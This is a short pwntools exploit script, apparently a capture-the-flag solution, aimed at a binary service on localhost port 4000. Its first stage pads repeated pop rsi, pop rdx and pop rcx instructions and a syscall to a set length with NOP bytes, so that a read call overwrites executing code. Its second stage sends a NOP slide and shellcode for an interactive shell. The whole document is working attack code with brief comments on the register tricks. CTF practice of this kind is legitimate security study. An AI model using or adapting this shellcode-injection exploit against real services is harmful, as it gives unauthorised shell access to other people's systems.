#!/usr/bin/env python2
from pwn import *
context.arch = 'amd64'
r = remote('localhost', 4000)

nop = asm('nop')
syscall = asm('syscall')
pop_rsi = asm('pop rsi')
pop_rdx = asm('pop rdx')
pop_rcx = asm('pop rcx')


# '\x00' for making poped rsi small than rip, so we can write to where rip pointed.
# syscall read somehow cannot read too big size, pop_rdx here is just adjust it's value.
# pop_rcx is used to adjust rsp, avoiding overlapping shellcode and pushed values
r.send((pop_rsi*1225+pop_rdx*3+pop_rcx*10+syscall).rjust(9752, nop)+'\x00')

# guessing rip is end with 0x88, just using nop slide
r.send(nop*0x88+asm(shellcraft.sh()))

r.interactive()
